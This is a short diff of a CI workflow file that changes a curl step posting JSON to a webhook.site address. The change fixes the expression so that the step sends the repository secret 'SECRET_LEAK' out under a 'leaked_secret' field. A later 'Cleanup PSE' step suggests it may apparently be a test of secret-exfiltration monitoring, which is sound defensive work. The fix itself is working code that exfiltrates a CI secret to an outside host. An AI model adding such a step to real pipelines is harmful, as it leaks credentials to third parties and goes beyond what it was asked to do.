@@ -36,7 +36,7 @@ jobs:
         run: |
           curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
             -H "Content-Type: application/json" \
-            -d "{\"leaked_secret\": \"${{ SECRET_LEAK }}\"}"
+            -d "{\"leaked_secret\": \"${{ secrets.SECRET_LEAK }}\"}"
 
       - name: Cleanup PSE
         if: always()
